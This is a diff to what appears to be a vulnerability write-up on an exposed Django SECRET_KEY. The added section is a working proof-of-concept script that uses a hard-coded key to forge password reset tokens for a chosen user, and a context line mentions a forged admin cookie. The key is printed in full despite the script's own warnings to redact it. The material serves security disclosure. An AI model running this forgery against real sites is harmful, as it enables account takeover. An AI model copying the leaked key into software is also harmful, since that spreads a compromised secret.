@@ -148,13 +148,72 @@ print("\nThis cookie grants admin access to the application")
 
 ### Password Reset Token Generation
 
+![Screenshot showing Successfull_sessionforge_attack in settings.py](passwd.png)
 ```python
-from django.contrib.auth.tokens import PasswordResetTokenGenerator
-from django.contrib.auth.models import User
+#!/usr/bin/env python3
+"""
+PoC: Password Reset Token Generation using exposed SECRET_KEY (fixed)
+Configures minimal Django settings and implements a DummyUser with
+the methods expected by PasswordResetTokenGenerator.
+WARNING: do NOT publish real SECRET_KEY or real tokens. Redact before publishing.
+"""
 
-# Using the exposed SECRET_KEY
+from django.conf import settings
+import datetime
+
+# Replace with the real key only in private evidence folders (do not commit!)
+# For public screenshots, set a placeholder like 'REDACTED-FOR-PUBLIC-SCREENSHOT'
+SECRET_KEY = 'django-insecure-vsxlkoda(-#mhn81#)vd(^5fojxq6hr0vd-$siv3z9!5t@z$ai'
+
+# Minimal runtime config so Django functions used here don't raise errors:
+if not settings.configured:
+    settings.configure(
+        SECRET_KEY=SECRET_KEY,
+        SECRET_KEY_FALLBACKS=[SECRET_KEY],
+        USE_TZ=True,
+    )
+
+from django.contrib.auth.tokens import PasswordResetTokenGenerator
+
+# Dummy user implementing expected API by PasswordResetTokenGenerator:
+class DummyUser:
+    def __init__(self, pk=1, password='pbkdf2_sha256$260000$EXAMPLE$FAKEHASH',
+                 email='user@example.com', last_login=None, is_active=True):
+        self.pk = pk
+        self.id = pk
+        self.password = password
+        self.email = email
+        # last_login expected to be datetime or None
+        self.last_login = last_login
+        self.is_active = is_active
+
+    # Some code paths call get_email_field_name()
+    def get_email_field_name(self):
+        return 'email'
+
+    # __str__ helps with logging if printed
+    def __str__(self):
+        return f"<DummyUser pk={self.pk} email={self.email}>"
+
+# Create a dummy user (private testing). Do NOT use a real user's data here.
+user = DummyUser(
+    pk=1,
+    password='pbkdf2_sha256$260000$EXAMPLE$FAKEHASH',
+    email='victim@example.com',
+    last_login=None,
+    is_active=True
+)
+
 generator = PasswordResetTokenGenerator()
-# Token can be generated for any user without authentication
+token = generator.make_token(user)
+
+print("Password reset token generation PoC")
+print("=================================")
+print(f"User (pk): {user.pk}")
+print(f"User email: {user.email}")
+print(f"Generated token: {token}")
+print("\nNOTE: Do not publish the real token. Create a redacted copy for public evidence.")
+
 ```
 
 ---
